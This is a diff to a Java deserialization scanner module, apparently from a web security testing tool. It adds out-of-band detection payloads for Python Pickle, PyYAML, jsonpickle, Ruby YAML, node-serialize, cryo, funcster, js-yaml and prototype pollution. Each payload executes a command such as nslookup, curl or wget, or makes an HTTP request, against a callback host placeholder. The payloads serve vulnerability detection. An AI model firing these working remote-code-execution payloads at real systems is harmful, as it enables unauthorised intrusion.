@@ -1994,11 +1994,23 @@ public class DeserializationScanner implements ScanModule {
         DeserPayloadGenerator.Language genLang = mapGeneratorLanguage(dp.language);
         if (genLang == null) return;
 
-        Map<String, String> chains = DeserPayloadGenerator.getAvailableChains(genLang);
+        Map<String, String> chains = DeserPayloadGenerator.getGeneratableChains(genLang);
 
+        chainLoop:
         for (var entry : chains.entrySet()) {
             String chainName = entry.getKey();
             String[][] cmdTemplates = getOobCommandsForChain(chainName, genLang);
+
+            // Binary chains (Java ObjectOutputStream, Ruby Marshal, Python Pickle v2/v4)
+            // produce raw bytes that cannot survive new String(bytes, UTF_8) conversion.
+            // Only BASE64 encoding preserves them. Text chains (PHP, .NET, YAML, JSON)
+            // are safe with RAW and BASE64.
+            boolean isBinary = isBinaryChain(genLang, chainName);
+            DeserPayloadGenerator.Encoding[] encodings = isBinary
+                    ? new DeserPayloadGenerator.Encoding[]{ DeserPayloadGenerator.Encoding.BASE64 }
+                    : new DeserPayloadGenerator.Encoding[]{
+                            DeserPayloadGenerator.Encoding.RAW,
+                            DeserPayloadGenerator.Encoding.BASE64 };
 
             for (String[] cmdInfo : cmdTemplates) {
                 String cmdTemplate = cmdInfo[0];
@@ -2012,13 +2024,6 @@ public class DeserializationScanner implements ScanModule {
                 // resolveTemplate handles COLLAB_PLACEHOLDER replacement and
                 // rewrites DNS commands for custom OOB (nslookup, dig, host, ping, Resolve-DnsName)
                 String resolvedCmd = collaboratorManager.resolveTemplate(cmdTemplate, collabPayload);
-
-                // Try multiple encodings: raw (text formats), base64 (binary), URL-encoded
-                DeserPayloadGenerator.Encoding[] encodings = {
-                        DeserPayloadGenerator.Encoding.RAW,
-                        DeserPayloadGenerator.Encoding.BASE64,
-                        DeserPayloadGenerator.Encoding.URL_ENCODED,
-                };
 
                 for (DeserPayloadGenerator.Encoding enc : encodings) {
                     try {
@@ -2035,12 +2040,32 @@ public class DeserializationScanner implements ScanModule {
                         HttpRequestResponse result = sendPayload(original, dp, payloadStr);
                         sentRequest.compareAndSet(null, result);
                         perHostDelay();
+                    } catch (UnsupportedOperationException e) {
+                        // Chain requires libraries not bundled (e.g., Spring, Hibernate) — skip entirely
+                        continue chainLoop;
                     } catch (Exception e) {
-                        // Chain may not support this command or encoding — skip
+                        api.logging().logToError("[Deser Generator] " + chainName + "/" + enc
+                                + " failed: " + e.getMessage());
                     }
                 }
             }
         }
+    }
+
+    /**
+     * Determine if a chain produces binary output that cannot survive UTF-8 String conversion.
+     * Java ObjectOutputStream, Ruby Marshal, and Python Pickle v2/v4 produce raw binary.
+     * PHP serialize, .NET (SOAP/XAML/JSON), YAML, JSON, and Pickle v0 are text-safe.
+     */
+    private static boolean isBinaryChain(DeserPayloadGenerator.Language lang, String chain) {
+        return switch (lang) {
+            case JAVA   -> true;  // All Java chains produce ObjectOutputStream binary
+            case DOTNET -> false; // .NET payloads are SOAP XML, XAML, or JSON text
+            case PHP    -> false; // PHP serialize() is text
+            case NODEJS -> false; // All Node.js payloads are JSON/YAML text
+            case PYTHON -> chain.startsWith("Pickle2/") || chain.startsWith("Pickle4/");
+            case RUBY   -> !chain.startsWith("YAML/") && !chain.startsWith("Oj/");
+        };
     }
 
     /**
@@ -2215,7 +2240,88 @@ public class DeserializationScanner implements ScanModule {
                                 + ":\"http://COLLAB_PLACEHOLDER/wp\";}i:1;s:1:\"x\";}}",
                         "WordPress WP_HTML_Token + SoapClient OOB"});
                 break;
-            // Python, Ruby, Node.js: covered by DeserPayloadGenerator in Phase 1
+            case "Python":
+                // Pickle os.system — nslookup/curl/wget
+                oobTemplateList.add(new String[]{"cos\nsystem\n(S'nslookup COLLAB_PLACEHOLDER'\ntR.", "Pickle nslookup"});
+                oobTemplateList.add(new String[]{"cos\nsystem\n(S'curl http://COLLAB_PLACEHOLDER/deser'\ntR.", "Pickle curl"});
+                oobTemplateList.add(new String[]{"cos\nsystem\n(S'wget http://COLLAB_PLACEHOLDER/deser'\ntR.", "Pickle wget"});
+                // Pickle os.popen
+                oobTemplateList.add(new String[]{"cos\npopen\n(S'nslookup COLLAB_PLACEHOLDER'\ntR.", "Pickle os.popen nslookup"});
+                // Pickle urllib — HTTP GET without shell
+                oobTemplateList.add(new String[]{"curllib.request\nurlopen\n(S'http://COLLAB_PLACEHOLDER/urllib'\ntR.", "Pickle urllib OOB"});
+                // Pickle builtins.exec + urllib
+                oobTemplateList.add(new String[]{"cbuiltins\nexec\n(S'import urllib.request;urllib.request.urlopen(\"http://COLLAB_PLACEHOLDER/exec\")'\ntR.", "Pickle exec urllib OOB"});
+                // PyYAML !!python/object — os.system
+                oobTemplateList.add(new String[]{"!!python/object/apply:os.system [\"nslookup COLLAB_PLACEHOLDER\"]", "PyYAML os.system nslookup"});
+                oobTemplateList.add(new String[]{"!!python/object/apply:os.system [\"curl http://COLLAB_PLACEHOLDER/yaml\"]", "PyYAML os.system curl"});
+                // PyYAML subprocess.Popen
+                oobTemplateList.add(new String[]{"!!python/object/apply:subprocess.Popen [[\"nslookup\",\"COLLAB_PLACEHOLDER\"]]", "PyYAML subprocess nslookup"});
+                // jsonpickle
+                oobTemplateList.add(new String[]{"{\"py/reduce\":[{\"py/function\":\"os.system\"},{\"py/tuple\":[\"nslookup COLLAB_PLACEHOLDER\"]}]}", "jsonpickle nslookup"});
+                oobTemplateList.add(new String[]{"{\"py/reduce\":[{\"py/function\":\"os.system\"},{\"py/tuple\":[\"curl http://COLLAB_PLACEHOLDER/jp\"]}]}", "jsonpickle curl"});
+                // Pickle exec + requests
+                oobTemplateList.add(new String[]{"cbuiltins\nexec\n(S'import requests;requests.get(\"http://COLLAB_PLACEHOLDER/pyreq\")'\ntR.", "Pickle exec requests OOB"});
+                // Pickle exec + http.client
+                oobTemplateList.add(new String[]{"cbuiltins\nexec\n(S'import http.client;http.client.HTTPConnection(\"COLLAB_PLACEHOLDER\").request(\"GET\",\"/\")'\ntR.", "Pickle exec http.client OOB"});
+                break;
+            case "Ruby":
+                // Ruby YAML Gem::Source — @uri triggers HTTP fetch
+                oobTemplateList.add(new String[]{
+                        "--- !ruby/object:Gem::Source\nuri: http://COLLAB_PLACEHOLDER/gem",
+                        "Ruby YAML Gem::Source OOB"});
+                break;
+            case "Node.js":
+                // node-serialize IIFE with require('http')
+                oobTemplateList.add(new String[]{
+                        "{\"rce\":\"_$$ND_FUNC$$_function(){var http=require('http');"
+                                + "http.get('http://COLLAB_PLACEHOLDER/node')}()\"}",
+                        "node-serialize HTTP OOB"});
+                // node-serialize nslookup
+                oobTemplateList.add(new String[]{
+                        "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process')"
+                                + ".execSync('nslookup COLLAB_PLACEHOLDER')}()\"}",
+                        "node-serialize nslookup OOB"});
+                // node-serialize curl/wget
+                oobTemplateList.add(new String[]{
+                        "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process')"
+                                + ".execSync('curl http://COLLAB_PLACEHOLDER/node2')}()\"}",
+                        "node-serialize curl OOB"});
+                oobTemplateList.add(new String[]{
+                        "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process')"
+                                + ".execSync('wget http://COLLAB_PLACEHOLDER/node3')}()\"}",
+                        "node-serialize wget OOB"});
+                // cryo
+                oobTemplateList.add(new String[]{
+                        "{\"__cryo_type__\":\"Function\","
+                                + "\"body\":\"return require('http').get('http://COLLAB_PLACEHOLDER/cryo')\"}",
+                        "cryo HTTP OOB"});
+                oobTemplateList.add(new String[]{
+                        "{\"__cryo_type__\":\"Function\","
+                                + "\"body\":\"return require('child_process').execSync('nslookup COLLAB_PLACEHOLDER')\"}",
+                        "cryo nslookup OOB"});
+                // funcster
+                oobTemplateList.add(new String[]{
+                        "{\"__js_function\":\"function(){require('http').get('http://COLLAB_PLACEHOLDER/funcster')}\"}",
+                        "funcster HTTP OOB"});
+                oobTemplateList.add(new String[]{
+                        "{\"__js_function\":\"function(){require('child_process').execSync('nslookup COLLAB_PLACEHOLDER')}\"}",
+                        "funcster nslookup OOB"});
+                // js-yaml
+                oobTemplateList.add(new String[]{
+                        "!!js/function 'function(){require(\"http\").get(\"http://COLLAB_PLACEHOLDER/jsyaml\")}'",
+                        "js-yaml HTTP OOB"});
+                oobTemplateList.add(new String[]{
+                        "!!js/function 'function(){require(\"child_process\").execSync(\"nslookup COLLAB_PLACEHOLDER\")}'",
+                        "js-yaml nslookup OOB"});
+                // node-serialize DNS resolve (no shell)
+                oobTemplateList.add(new String[]{
+                        "{\"rce\":\"_$$ND_FUNC$$_function(){require('dns').resolve('COLLAB_PLACEHOLDER',function(){})}()\"}",
+                        "node-serialize DNS resolve OOB"});
+                // Prototype pollution
+                oobTemplateList.add(new String[]{
+                        "{\"constructor\":{\"prototype\":{\"outputFunctionName\":\"x;require('child_process').execSync('nslookup COLLAB_PLACEHOLDER');x\"}}}",
+                        "Prototype pollution nslookup OOB"});
+                break;
             default:
                 break;
         }
